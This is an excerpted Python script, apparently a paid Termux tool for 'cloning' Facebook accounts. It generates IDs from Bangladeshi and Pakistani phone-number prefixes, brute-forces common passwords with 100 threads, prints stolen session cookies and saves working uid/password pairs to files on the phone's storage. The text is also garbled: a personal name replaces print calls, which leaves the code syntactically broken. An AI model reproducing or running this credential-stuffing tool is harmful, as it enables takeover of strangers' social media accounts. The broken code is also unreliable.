...
ha = current.day
today = date.today()
#os.system('xdg-open https://youtube.com/@its_onik)
os.system('espeak -a 300 "WELCOME TO ONIK RANDOM CLONING TOOLS"')
logo =("""\033[0;92m
       
   
     
...
def onik():
    os.system('clear')
    os.system('xdg-open https://youtube.com/@onikafridi')
    MR ONIK(logo)
...
def action():
    ...
    if MR ONIK == '':
        ...
        mahd = input('Chouse :')
        if mahd =='1':
            os.system("xdg-open https://facebook.com/devilonik.00")
            onik()
        elif mahd == '2':
...
def onik_email():
    ...
    os.system("clear")
    MR ONIK(logo)
    MR ONIK(f' [{xr}^{x}] Example>: {xr}019,017,018,016,015{x}')
    MR ONIK(" -----------------------------------------------------------------------------------")
    rk1 = '.'
    rk2 = '1'
    rk3 = '0'
    ...
    with ThreadPool(max_workers=100) as manshera:
        ...
        tl = str(len(user))
        MR ONIK('\033[1;97m====================================================')
        MR ONIK(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
        MR ONIK(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
        MR ONIK(f'{x}[{xr}^{x}]\033[0;92m YOU INPU NAME :'+fastname+lasttname)
        MR ONIK(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
        MR ONIK(f'\033[0;97m[{xr}^{x}] \033[0;95mSlow Cloning')
        MR ONIK('\033[1;97m====================================================')
        for love in user:
            onikuser=fastname+code+lasttname+love
...
def onik_bd():
    ...
    with ThreadPool(max_workers=100) as manshera:
        ...
        MR ONIK(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
        MR ONIK(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
        MR ONIK(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
        MR ONIK(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
        MR ONIK(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
        MR ONIK('\033[1;97m====================================================')
        for love in user:
...
def onik_pk():
    ...
    os.system("clear")
    MR ONIK(logo)
    MR ONIK(f' [{xr}^{x}] Example>: {xr}92318,92345,92323,92306.ETC{x}')
    MR ONIK(" ----------------------------------------------------------------------------------------------------")
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[onik-OK] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                sn4gdh9('/sdcard/onik-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\33[1;30m[onik-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                sn4gdh9('/sdcard/onik-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}onik{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
...
def reg():
    ...
    r = requests.get('https://raw.githubusercontent.com/Mronik404/MR ONIK/aproval.text').text
    if to in r:
        os.system('clear')
        ...
        os.system('am start https://wa.me/+8801918397961?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20onik%20Paid%20Tools.%20My%20Key:%20'+id+onik)
        reg()
...
def reg2():
    ...
    print (' Your id: ' + id+onik)
    print ('')
    input(' Press enter to go to whatsapp ')
    os.system('am start https://wa.me/+8801918397961?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20onik=MEX%20Paid%20Tools.%20My%20Key:%20'+id+onik)
